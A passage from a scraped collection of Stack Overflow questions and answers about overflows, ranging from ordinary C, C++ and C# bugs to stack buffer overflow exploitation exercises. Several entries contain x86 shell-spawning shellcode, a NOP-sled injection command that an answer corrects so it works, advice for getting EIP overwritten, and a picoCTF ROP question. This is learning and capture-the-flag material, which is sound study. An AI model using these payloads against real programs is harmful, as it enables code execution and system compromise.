printf(\"\\nThread %d of %d has finished sorting.\", myID, totalThread);\n\n        //Find the start of output array\n        int startIndex = 0;\n        for( int i = 0; i < myID; i++ ){\n            startIndex += groupMemberCount[i];\n        }\n\n        //Combine array\n        for (int k = 0; k < memberCount; k++) {\n\n            outputArr[startIndex + k] = myGroup[k];\n\n        }\n\n        printf(\"\\nArray from thread %d has combined.\", myID);\n\n        omp_free(myGroup, omp_large_cap_mem_alloc);\n        omp_free(temp, omp_large_cap_mem_alloc);\n    }\n\n    free(numArr);\n    free(outputArr);\n    free(groupMemberCount);\n\n    clock_t end = clock();\n\n    timeSpent = (double)(end - begin) / CLOCKS_PER_SEC;\n\n    printf(\"\\nTime spent sorting: %f seconds.\\n\", timeSpent);\n\n    return 0;\n}\n\nI compiled it with gcc -fopenmp ./bucketSort.c -o ./bucketSort. Everything runs fine until I start testing with 100K integers (I wrote 200K in the topic because my program allocate it twice). The program immediately return malloc(): corrupted top size after printing Finished Random (so the first 100K in numArr is fine?). This is the first time I used malloc() and omp_alloc(), so feel free to correct me if I've done something wrong. I'm running this code in Ubuntu WSL btw.\nWhat I've tried:\n\nI tried calloc() but the result is the same, error after 2nd calloc().\nI tried increase ulimit to unlimit.\n\n",
        "Answer": "Usually, valgrind or -fsanitize=address give good diagnostics for such errors.\nCompiling and linking with -fsanitize=address shows that there is a heap overflow on this line:\n                temp[memberCount] = numArr[j];\n\nThe memberCount variable is equal to rangePerBucket at this point.  Both are one less than randomTime.  But the temp array has only rangePerBucket elements, so that index is out of range.\n",
        "Source": "https://stackoverflow.com/questions/77303320/malloc-corrupted-top-size-after-allocating-more-than-200k-int"
    },
    {
        "Title": "How to represent ASCII code 16 as a character?",
        "Question": "[C language] [Linux]\n\"ASCII code 16 is represented by the control character \u2410 also known as the data link escape\"\nI want to take this character from the keyboard as an input to a program that allows you to do a buffer overflow. It works only if i overwrite an INT variable with this value: 1161258512.\nI don't know how to build this number because it s not possible to write the single character 16 as an input. I also tried with the escape sequence but it didn't work. Maybe i should use unicode to do that and write the first 2 characters (with the 16 included) of the 4 byte payload.\nI'm new to this kind of things so please if you know more i would really appreciate it\n",
        "Answer": "\nit s not possible to write the single character 16 as an input\n\nThis is a strange expression. DLE is 0x10, 16, as you know.\nHow to get this from the keyboard depends much of many things you did not disclose: what OS?\nThe control key on input\nThe effect of pressing control as you type a key is to mask bits 5 and 6, those with values 32 and 64, so this is your answer:\nyou can use Ctrl+P, Ctrl+p or Ctrl+0 since there 3 possible values:\n\n0 is 0x30\nP is 0x50\nP is 0x70\n\nBut to read this you need to prepare your keyboard driver.  Under Linux and family pos-Unix use raw input and under Windows call ReadConsoleInput or similar.\nIn short you save the input configuration, prepare it to some that suits your needs, such disabling echo and buffering, then read the key codes. And at the end you restore everything.\nMicrosoft have a Console Reference. Under Linux man is your friend. Look for raw io and ioctl\n",
        "Source": "https://stackoverflow.com/questions/77077702/how-to-represent-ascii-code-16-as-a-character"
    },
    {
        "Title": "Changing values in hex-editor properly",
        "Question": "I want to change a file (.ULNC) and successfully did so in the past when the decoded texts i change have the same length or when the value I want to replace is bigger then the one i want to replace it with by filling the blanks with 00\nNow I have the issue, that the opposite is the case and my \"new\" encoded text is a bigger length than the original one.\nTo be more clear:\nI want to replace 53 61 6D 48 51 5F 41 with 53 61 6D 44 69 76 69 6E 67 5F 41\nwhat I want to change\nAny help or hint would be greatly appreciated!\nI tried just copying the value in like you see in the screenshot.\nmy attempt\nHxD Hex Editor warns me, it will change the filesize. When I confirm, start the program and load the changed file, it causes a bufferoverflow and crashes.\nI also tried... deleting some 00 00 00 00 in a place I thought they were not needed, the program then also crashed, this time without bufferoverflow warning.\n",
        "Answer": "I did it by shortening 53 61 6D 44 69 76 69 6E 67 5F 41 in the file it got originally referenced to 53 61 6D 44 69 76 69 and so kept the same byte size as  53 61 6D 48 51 5F 41.\nWorks now.\n",
        "Source": "https://stackoverflow.com/questions/76983981/changing-values-in-hex-editor-properly"
    },
    {
        "Title": "Overflow when reading a file",
        "Question": "When reading a simple file, I keep overflowing and reading bytes out of the file despite making sure I get the size of the file in bytes prior to the read.\nHere is my current code:\nFILE* file;\nint error_no = fopen_s(&file, filepath, \"r\");\n\nif (error_no != 0 || file == 0) {\n    std::cout << \"Error whilst reading file: \" + error_no;\n}\n\nfseek(file, 0, SEEK_END);\nsize_t size = ftell(file);\n\nchar* fileAsString = (char*) malloc(size+1);\n\nfseek(file, 0, SEEK_SET);\nfread(fileAsString, 1, size, file);\n\nfileAsString[size] = 0;\n\nstd::cout << \"\\n\" << size << \"\\n\";\nstd::cout << fileAsString;\n\nfclose(file);\n\nI am expecting to open the file, push the stream to the end of the file and use ftell to find the number of characters in the file.\nThen I make a string buffer to copy the file's content into.\nThen finally I reset the file stream and read it into my string buffer. I complete this by adding the end-of-string character at the end of the buffer.\nSadly this is what I get:\n114\n#version 330 core\n\nlayout(location = 0) out vec4 color;\n\nvoid main()\n{\n        color = vec4(1.0, 0.0, 0.0, 1.0);\n}\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nI checked and the file contains 107 characters, which explains the 114 length and 7 '=' characters that shouldn't be there.\nThe actual file contents are:\n#version 330 core\n\nlayout(location = 0) out vec4 color;\n\nvoid main()\n{\n    color = vec4(1.0, 0.0, 0.0, 1.0);\n}\n\nHope this is clear enough!\n",
        "Answer": "When you read a file with \"r\" mode, you are reading in text mode and your two-byte \\r\\n line endings are being converted to \\n strings in memory.  But ftell is returning the length of the file in bytes (with each newline counting for two bytes).  But you are marking the end of the string (by setting a null character) according to how  many bytes were in the file, as opposed to how many characters are in the string.  Since you have placed your null terminator past the end of the string, you have one character of junk for each newline in your original file.\nInstead, you probably want to preserve the bytes of the original file. To do this, try opening the file in \"rb\" mode to read it in binary mode which should prevent it from changing \\r\\n in the file to \\n in the string in memory.\n",
        "Source": "https://stackoverflow.com/questions/76958048/overflow-when-reading-a-file"
    },
    {
        "Title": "Index overflow in for loop with nested thread",
        "Question": "I am writing a testing utility (a WinForm) to check how a web site perform. To do so i set a number of request to make, with a list of parameters associated with requests. I can set the requests to happen in parallel or in sequence.\nIf i work in sequence everything is fine, but if i work in parallel i get a strange issue with the for loop.\nI know i may use Parallel.For but because i am investigating another bug related to parallelism i temporary used a regualr for, with a nested action executed directly or with a Task.Run().\nHere the problematic code :\nprivate void Run()\n{\n    ConcurrentBag<long> callTimes = new ConcurrentBag<long>();\n    int httpErrors = 0;\n    int progress = 0;\n\n    string uri = txtUrl.Text ?? string.Empty;\n    if (string.IsNullOrWhiteSpace(uri))\n        return;\n\n    Func<List<string>,int,long> testCall = (p,i) =>\n    {\n        try\n        {\n            using (var client = new HttpClient())\n            {\n                Stopwatch timer = new Stopwatch();\n                timer.Start();\n\n                string actualUrl = string.Format(uri, p.ToArray());\n                var getTask = client.GetAsync(actualUrl);\n                getTask.Wait();\n\n                timer.Stop();\n\n                var result = getTask.Result;\n                if (result == null || (int)result.StatusCode >= 400)\n                {\n                    txtErrors.ThreadSafeAppendText($\"Connection error {(result?.StatusCode.ToString() ?? \"NULL\")}'\\r\\n\");\n                    Interlocked.Increment(ref httpErrors);\n                }\n\n                return timer.ElapsedMilliseconds;\n            }\n        }\n        catch ( Exception actionErr)\n        {\n            txtErrors.ThreadSafeAppendText($\"Error while execution callAction {i} with parameters '{string.Join(\", \" , p)}' : \\r\\n\" + actionErr.Message);\n        }\n\n        return -1;\n    };\n\n    try\n    {\n        List<List<string>> parameters = this.ParseParameters();\n        int parametersCount = parameters.Count;\n        int executions = (int)updRequests.Value;\n\n        //used to randomly access parameters in a way suitable also for the parallel scenario (i precompute all the random number i need while parallel processing is not yet started)\n        Random rng = new Random();\n        List<int> randoms = new List<int>();\n        for (int i = 0; i < executions; i++)\n            randoms.Add(rng.Next(0, parametersCount));\n\n        //randoms.Count is guaranteed to be equal to executions \n\n\n        for ( int index = 0; index < executions; index++)\n        {\n            Action parallelAction = () =>\n            {\n                int currentIndex = index;\n                List<string> currentParameter = parameters[randoms[currentIndex] % parametersCount]; //<<--- strange overflow here currentIndex >= executions\n                callTimes.Add(testCall(currentParameter, currentIndex));\n\n                Interlocked.Increment(ref progress);\n\n                if (progress % 10 == 0)\n                    prbProgress.ThreadSafeAction(this.RefreshProgressBar, progress, executions);\n            };\n\n            if (chkParallelExecution.Checked)\n                Task.Run(parallelAction);\n            else\n                parallelAction();\n        }\n\n\n        this.Reporting(callTimes, httpErrors);\n    }\n    catch (Exception err)\n    {\n        txtErrors.ThreadSafeAppendText($\"Error while running stress test : \\r\\n\" + err.Message);\n    }\n}\n\nThe strange thing i don't understand is how the variable called currentIndex become >= executions variable, because only the loop manipulate those two variable and should enforce the opposite.\nSo i think i am missing something in my understanding on how parallel processing happen here.\n",
        "Answer": "There is a fairly well known issue with capturing loop variables.\nSo you should probably write\nfor ( int index = 0; index < executions; index++)\n{\n    int currentIndex = index;\n    Action parallelAction = () =>\n    {\n        ...\n\nAnother possible issue:\nparameters[randoms[currentIndex] % parametersCount];\n\nFor all you know the values in randoms could all be zero. Are you sure you don't want to create an array of 0..executions, and shuffle this instead?\nI can't see any obvious reasons why this example should fail however. But errors with indices etc should be rather obvious if you do some debugging.\n",
        "Source": "https://stackoverflow.com/questions/76874536/index-overflow-in-for-loop-with-nested-thread"
    },
    {
        "Title": "Not getting the expected output when running a shell code in a buffer overflow",
        "Question": "After finding the eip offset i'm trying to input some shell code to my program. With the following command run $(python -c 'print(\"A\"*108 + \"BBBB\")') i get the following output\nProgram received signal SIGSEGV, Segmentation fault.\n0x42424242 in ?? ()\n\nNow the problem occurs when i try to add my shell code. When i input\nrun $(python -c 'print(\"\\x90\"*63 + \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" + \"B\" * 20)')\n\ni don't get what i was exepected, the return address being overwritten with B's, but i get the following\nProgram received signal SIGSEGV, Segmentation fault.\n0x90c290c2 in ?? ()\n\nIt does work, when i increase the number of B's to 48 and decrease the number of NOPs to 35, but i'm not quite understanding why this doesn't work with more NOPs and less B's for the return address. One other thing i do not understand is that i'm not seeing any NOPs in my stack.\n(gdb) x/200x $esp\n0xffffd2a0: 0x42424242  0x42424242  0x42424242  0x42424242\n0xffffd2b0: 0x42424242  0x42424242  0x42424242  0x42424242\n0xffffd2c0: 0x42424242  0x42424242  0x00424242  0x00000001\n0xffffd2d0: 0xffffd398  0x68e47ce5  0x9e780f0a  0x00000000\n0xffffd2e0: 0x00000000  0x00000000  0xffffd3e0  0x0804b519\n0xffffd2f0: 0x00000000  0x08049c76  0xffffd3e0  0x0804b52d\n0xffffd300: 0x00000000  0x00000000  0x00000000  0x0804968d\n0xffffd310: 0x00000040  0x0000000c  0x00000040  0x00000008\n0xffffd320: 0x00040000  0x00000040  0x00002000  0x00300000\n0xffffd330: 0x00090000  0x00040000  0x00002000  0x00008000\n0xffffd340: 0xffffd370  0xffffd3d4  0x00000002  0x00000001\n0xffffd350: 0x00000006  0x00000045  0x00000001  0x00300000\n0xffffd360: 0x000c0000  0x00000004  0x00000001  0x00000000\n0xffffd370: 0xffffffff  0x00000000  0x080e3620  0x00000000\n0xffffd380: 0x00000000  0x00000000  0xffffd3b0  0x080e3ff4\n0xffffd390: 0x00000002  0x00000000  0x00000000  0x08049688\n0xffffd3a0: 0x00000000  0x00000000  0x00000000  0x08049688\n0xffffd3b0: 0x0804968d  0x00000002  0xffffd3d4  0x00000000\n0xffffd3c0: 0x00000000  0x00000000  0xffffd3cc  0x00000000\n0xffffd3d0: 0x00000002  0xffffd5d2  0xffffd609  0x00000000\n0xffffd3e0: 0xffffd6a5  0xffffd6b5  0xffffd6c9  0xffffd6ff\n0xffffd3f0: 0xffffd70c  0xffffd746  0xffffd773  0xffffd78a\n0xffffd400: 0xffffd79e  0xffffd7d1  0xffffd80f  0xffffd826\n0xffffd410: 0xffffd83e  0xffffd881  0xffffd891  0xffffd89d\n0xffffd420: 0xffffd8bd  0xffffd8cc  0xffffd8ff  0xffffd90a\n0xffffd430: 0xffffd925  0xffffd93a  0xffffd94f  0xffffd95e\n0xffffd440: 0xffffd97e  0xffffd9ac  0xffffd9bb  0xffffd9c4\n0xffffd450: 0xffffda14  0xffffda22  0xffffda33  0xffffda48\n0xffffd460: 0xffffda60  0xffffda6c  0xffffdaf0  0xffffdb01\n0xffffd470: 0xffffdb35  0xffffdb64  0xffffdbb0  0xffffdbbf\n0xffffd480: 0xffffdbd4  0xffffdbeb  0xffffdc09  0xffffdc1d\n0xffffd490: 0xffffdc25  0xffffdc3b  0xffffdc6d  0xffffdc78\n0xffffd4a0: 0xffffdc80  0xffffdc99  0xffffdcb4  0xffffdcbf\n0xffffd4b0: 0xffffdcd0  0xffffdcef  0xffffdd21  0xffffdd35\n0xffffd4c0: 0xffffdd53  0xffffdd6a  0xffffdd83  0xffffdda1\n0xffffd4d0: 0xffffde16  0xffffde2c  0xffffde3c  0xffffdf08\n0xffffd4e0: 0xffffdf1a  0xffffdf50  0xffffdf6c  0xffffdf84\n0xffffd4f0: 0xffffdf9b  0x00000000  0x00000020  0xf7ffc570\n0xffffd500: 0x00000021  0xf7ffc000  0x00000033  0x000006f0\n0xffffd510: 0x00000010  0xbfebfbff  0x00000006  0x00001000\n0xffffd520: 0x00000011  0x00000064  0x00000003  0x08048034\n0xffffd530: 0x00000004  0x00000020  0x00000005  0x00000009\n0xffffd540: 0x00000007  0x00000000  0x00000008  0x00000000\n0xffffd550: 0x00000009  0x08049660  0x0000000b  0x000003e8\n0xffffd560: 0x0000000c  0x000003e8  0x0000000d  0x000003e8\n0xffffd570: 0x0000000e  0x000003e8  0x00000017  0x00000000\n0xffffd580: 0x00000019  0xffffd5bb  0x0000001a  0x00000002\n0xffffd590: 0x0000001f  0xffffdfc1  0x0000000f  0xffffd5cb\n0xffffd5a0: 0x0000001b  0x0000001c  0x0000001c  0x00000020\n0xffffd5b0: 0x00000000  0x00000000  0x62000000  0x9e72e32a\n\n\nI'm using Python 3. The shell code is 25 bytes long. I have already disabled ASLR.\nThis is my code in C\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv){\n    char buffer[100];\n    strcpy(buffer, argv[1]);\n\n    return 0;\n}\n\n",
        "Answer": "Python3's string literals \"...\" default to UTF-8 (Unicode) encoding when printing, not 8-bit ASCII (ISO-8859-1/Latin-1). As a result extra characters are being output that renders your shellcode unusable.\nIf you were to run your Python command like:\npython -c 'print(\"\\x90\"*63 + \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" + \"B\" * 20)' | hexdump -C\n\nPiping the output through hexdump can make the issue more obvious. The output will look something like:\n00000000  c2 90 c2 90 c2 90 c2 90  c2 90 c2 90 c2 90 c2 90  |................|\n*\n00000070  c2 90 c2 90 c2 90 c2 90  c2 90 c2 90 c2 90 c3 ab  |................|\n00000080  0b 5b 31 c3 80 31 c3 89  31 c3 92 c2 b0 0b c3 8d  |.[1..1..1.......|\n00000090  c2 80 c3 a8 c3 b0 c3 bf  c3 bf c3 bf 2f 62 69 6e  |............/bin|\n000000a0  2f 73 68 42 42 42 42 42  42 42 42 42 42 42 42 42  |/shBBBBBBBBBBBBB|\n000000b0  42 42 42 42 42 42 42 0a                           |BBBBBBB.|\n000000b8\n\nYou'll notice that the value C2 and C3 have been inserted into the middle of your code for those characters that are >= 0x80. As a result the output is no longer suitable as shellcode.\nIf you switch to using Python2 the problem would resolve itself since it doesn't default to a Unicode character set. Something that works for Python2 and Python3 is the use of byte string literals b'...' and use sys.stdout.buffer.write to output the bytes to standard output.\nA command like this should work in GDB:\nrun $(python -c \"import sys; sys.stdout.buffer.write(b'\\x90'*63 + b'\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68' + b'B' * 20)\")\n\n",
        "Source": "https://stackoverflow.com/questions/78100496/not-getting-the-expected-output-when-running-a-shell-code-in-a-buffer-overflow"
    },
    {
        "Title": "EIP doesn&#39;t get overwritten when perfoming a buffer overflow attack",
        "Question": "I was watching this video on youtube: https://www.youtube.com/watch?v=1S0aBV-Waeo and i was trying to do the same steps shown in the video, but i can't seem to overwrite the EIP. I don't know if it's because the gdb may have changed during the years, or if anything else has. What i get when i try to overflow is the following\nProgram received signal SIGSEGV, Segmentation fault.\n0x080491ac in main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n\nI can't seem to overwrite the eip, no matter how large my input is. The code is the same as shown in the video with a smaller buffer size.\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv){\n    char buffer[10];\n    strcpy(buffer, argv[1]);\n\n    return 0;\n}\n\nI also get asked the following when running my program in gdb for the first time\nThis GDB supports auto-downloading debuginfo from the following URLs:\n  <https://debuginfod.archlinux.org>\nEnable debuginfod for this session? (y or [n]) \n\nThis is the register info in gdb\n(gdb) info reg\neax            0x0                 0\necx            0xffffd6b2          -10574\nedx            0xffffd396          -11370\nebx            0x804bff4           134529012\nesp            0xffffd390          0xffffd390\nebp            0xffffd3a8          0xffffd3a8\nesi            0xffffd480          -11136\nedi            0xf7ffcb60          -134231200\neip            0x80491a3           0x80491a3 <main+61>\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n\n(gdb) x/20x $esp\n0xffffd390: 0xffffffff  0x4141d3d4  0x41414141  0x41414141\n0xffffd3a0: 0xffff0041  0xf7e1fe2c  0x00000000  0xf7c20af9\n0xffffd3b0: 0x00000000  0x00000000  0x080482e7  0xf7c20af9\n0xffffd3c0: 0x00000002  0xffffd474  0xffffd480  0xffffd3e0\n0xffffd3d0: 0xf7e1fe2c  0x0804907d  0x00000002  0xffffd474\n\nI'm compiling with the following flags\ngcc -o example2 -fno-stack-protector -no-pie -m32 -g -z execstack example2.c -w\n\nThe whole interaction on gdb\n(gdb) disassemble main\nDump of assembler code for function main:\n   0x080497d5 <+0>: lea    0x4(%esp),%ecx\n   0x080497d9 <+4>: and    $0xfffffff0,%esp\n   0x080497dc <+7>: push   -0x4(%ecx)\n   0x080497df <+10>:    push   %ebp\n   0x080497e0 <+11>:    mov    %esp,%ebp\n   0x080497e2 <+13>:    push   %ebx\n   0x080497e3 <+14>:    push   %ecx\n   0x080497e4 <+15>:    sub    $0x10,%esp\n   0x080497e7 <+18>:    call   0x804981c <__x86.get_pc_thunk.ax>\n   0x080497ec <+23>:    add    $0x9a808,%eax\n   0x080497f1 <+28>:    mov    %ecx,%edx\n   0x080497f3 <+30>:    mov    0x4(%edx),%edx\n   0x080497f6 <+33>:    add    $0x4,%edx\n   0x080497f9 <+36>:    mov    (%edx),%edx\n   0x080497fb <+38>:    sub    $0x8,%esp\n   0x080497fe <+41>:    push   %edx\n   0x080497ff <+42>:    lea    -0x12(%ebp),%edx\n   0x08049802 <+45>:    push   %edx\n   0x08049803 <+46>:    mov    %eax,%ebx\n   0x08049805 <+48>:    call   0x8049020\n   0x0804980a <+53>:    add    $0x10,%esp\n   0x0804980d <+56>:    mov    $0x0,%eax\n--Type <RET> for more, q to quit, c to continue without paging--\n   0x08049812 <+61>:    lea    -0x8(%ebp),%esp\n   0x08049815 <+64>:    pop    %ecx\n   0x08049816 <+65>:    pop    %ebx\n   0x08049817 <+66>:    pop    %ebp\n   0x08049818 <+67>:    lea    -0x4(%ecx),%esp\n   0x0804981b <+70>:    ret\nEnd of assembler dump.\n(gdb) break *0x08049805\nBreakpoint 1 at 0x8049805: file example.c, line 6.\n(gdb) break *0x08049812\nBreakpoint 2 at 0x8049812: file example.c, line 9.\n(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAA\nStarting program: /home/r3/buffer-overflows/bo in memory example/example AAAAAAAAAAAAAAAAAAAAAAAAA\n\nThis GDB supports auto-downloading debuginfo from the following URLs:\n  <https://debuginfod.archlinux.org>\nEnable debuginfod for this session? (y or [n]) \nDebuginfod has been disabled.\nTo make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.\n\nBreakpoint 1, 0x08049805 in main (argc=2, argv=0xffffd464) at example.c:6\n6       strcpy(buffer, argv[1]);\n(gdb) info reg\neax            0x80e3ff4           135151604\necx            0xffffd330          -11472\nedx            0xffffd306          -11514\nebx            0x80e3ff4           135151604\nesp            0xffffd2f0          0xffffd2f0\nebp            0xffffd318          0xffffd318\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x8049805           0x8049805 <main+48>\neflags         0x292               [ AF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0xffffd2f0: 0xffffd306  0xffffd6a4  0x00000000  0x080497ec\n0xffffd300: 0x080ade17  0x080e7c04  0x08049030  0x080ae037\n0xffffd310: 0xffffd330  0x080e3ff4  0xffffd428  0x08049ceb\n0xffffd320: 0x00000021  0xffffd338  0x00067e1c  0x08049ceb\n0xffffd330: 0x00000002  0xffffd464  0xffffd470  0xffffd354\n(gdb) c\nContinuing.\n\nBreakpoint 2, main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n(gdb) info reg\neax            0x0                 0\necx            0xffffd6b0          -10576\nedx            0xffffd312          -11502\nebx            0x80e3ff4           135151604\nesp            0xffffd300          0xffffd300\nebp            0xffffd318          0xffffd318\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x8049812           0x8049812 <main+61>\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0xffffd300: 0x080ade17  0x41417c04  0x41414141  0x41414141\n0xffffd310: 0x41414141  0x41414141  0x41414141  0x00414141\n0xffffd320: 0x00000021  0xffffd338  0x00067e1c  0x08049ceb\n0xffffd330: 0x00000002  0xffffd464  0xffffd470  0xffffd354\n0xffffd340: 0x080e3ff4  0x0804968d  0x00000002  0xffffd464\n(gdb) c\nContinuing.\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0804981b in main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n(gdb) info reg\neax            0x0                 0\necx            0x41414141          1094795585\nedx            0xffffd312          -11502\nebx            0x41414141          1094795585\nesp            0x4141413d          0x4141413d\nebp            0x41414141          0x41414141\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x804981b           0x804981b <main+70>\neflags         0x10286             [ PF SF IF RF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0x4141413d: Cannot access memory at address 0x4141413d\n(gdb) c\nContinuing.\n\nProgram terminated with signal SIGSEGV, Segmentation fault.\nThe program no longer exists.\n\n",
        "Answer": "This code\n   0x08049815 <+64>:    pop    %ecx\n   0x08049816 <+65>:    pop    %ebx\n   0x08049817 <+66>:    pop    %ebp\n   0x08049818 <+67>:    lea    -0x4(%ecx),%esp\n   0x0804981b <+70>:    ret\n\nrestores registers from their saved location on stack. However, you've overwritten the stack contents, so all the registers are now set to 0x4141... values. And that causes the lea    -0x4(%ecx),%esp instruction to SIGSEGV, since ECX points to inaccessible memory.\nAs ssbssa commented, this is happening due to stack realignment (which itself is needed to deal with 64-bit aligned (newer) AVX etc.).\nIf I turn stack realignment off with -mpreferred-stack-boundary=2, the code becomes:\n   0x08049176 <+0>:     push   %ebp\n   0x08049177 <+1>:     mov    %esp,%ebp\n   0x08049179 <+3>:     sub    $0xc,%esp\n   0x0804917c <+6>:     mov    0xc(%ebp),%eax\n   0x0804917f <+9>:     add    $0x4,%eax\n   0x08049182 <+12>:    mov    (%eax),%eax\n   0x08049184 <+14>:    push   %eax\n   0x08049185 <+15>:    lea    -0xa(%ebp),%eax\n   0x08049188 <+18>:    push   %eax\n   0x08049189 <+19>:    call   0x8049050 <strcpy@plt>\n   0x0804918e <+24>:    add    $0x8,%esp\n   0x08049191 <+27>:    mov    $0x0,%eax\n   0x08049196 <+32>:    leave\n   0x08049197 <+33>:    ret\n\nand the RIP overwrite works:\nProgram received signal SIGSEGV, Segmentation fault.\n0x41414141 in ?? ()\n(gdb) x/i $pc\n=> 0x41414141:  Cannot access memory at address 0x41414141\n\n",
        "Source": "https://stackoverflow.com/questions/78053915/eip-doesnt-get-overwritten-when-perfoming-a-buffer-overflow-attack"
    },
    {
        "Title": "Buffer Overflow: Why does buffer assignment impact other variables?",
        "Question": "\nvoid foo() {\n    int value = 0;\n    char buf[4];\n    buf[4] = 1;\n\n\n    printf(\"value: %d\\n\", value);\n}\n\nint main() {\n    foo();\n    return 0;\n}\n\n\n\nWhy does 'value' print 1?\nI believe this has to do with buffer overflow and little endian but I am finding it hard to grasp.\n",
        "Answer": "Because it is Undefined Behaviour.\nIt is enough to change the optimization options and you will get different results.\nGodbolt for example:\n\nWith -O0 : 1\nWith -Os : 0\n\nBut it does not have to be like this. It can end up in the segfault or something else may happen.\nhttps://godbolt.org/z/TEbWbMvsa\n\nI understand it's undefined behavior. I was just wondering how this is\nrelated to little endian. When I went past buf[3] into buf[4], it\nstarted changing the next byte in memory. How do I know the next byte\nin memory is 'value'?\n\nYou cant know it. Order is not specified. value can be optimized out and not stored on the stack at all. You need to know your ABI and compiler very well to predict it.\nIn your case:\n+ 0x07: value byte 4  MSB\n+ 0x06: value byte 3\n+ 0x05: value byte 2\n+ 0x04: value byte 1  LSB\n+ 0x03: buf[3]\n+ 0x02: buf[2]\n+ 0x01: buf[1]\n+ 0x00: buf[0]\n\n",
        "Source": "https://stackoverflow.com/questions/77937810/buffer-overflow-why-does-buffer-assignment-impact-other-variables"
    },
    {
        "Title": "ROP - The use of the jmp esp",
        "Question": "I was playing some picoCTF challenges today and I found myself stuck in a challenge.\nDigging around the internet, I found a solution online which I cannot fully grasp.\nThe challenge (whose name I won't spoil for those who are playing picoCTF) revolves around a vulnerable x86 ELF, and it involves using ROP gadgets to gain a shell, however the checksec reveals that the binary is not PIE, and there is no NX enabled.\nBy breaking at ret of the vulnerable function, I noticed that the EAX register contains the start address of the buffer on the stack. Moreover, I found out that the offset between the start of the buffer and the saved EIP is 28 bytes.\nSo my first guess was to craft a sufficiently short shellcode, place it inside the buffer preceeded by a NOP sled, and overwrite the saved EIP with a gadget jumping to the content of the EAX register, aka the start of my buffer.\nHowever, I found out that this approach is not working.\nThe shellcode I crafted is:\nint 0x3   ; used for debugging purposes\nxor eax, eax\npush eax\npush 0x0068732f\npush 0x6e69622f\nxor ebx, ebx\npush eax\npush ebx\nmov ecx, esp\nmov al, 0xb\nint 0x80\n\nI assembled it using pwntool's asm library, setting the architecture to i386.\nThe debugger reveals the following after few steps in:\npwndbg> \n\nProgram received signal SIGSEGV, Segmentation fault.\n0xff854a01 in ?? ()\nLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS / show-flags off / show-compact-regs off ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n EAX  0x0\n EBX  0x0\n ECX  0x80e5300 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2088\n EDX  0xff854a10 \u2014\u25b8 0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n EDI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n ESI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n EBP  0x90909090\n ESP  0xff854a00 \u25c2\u2014 0x0\n EIP  0xff854a01 \u25c2\u2014 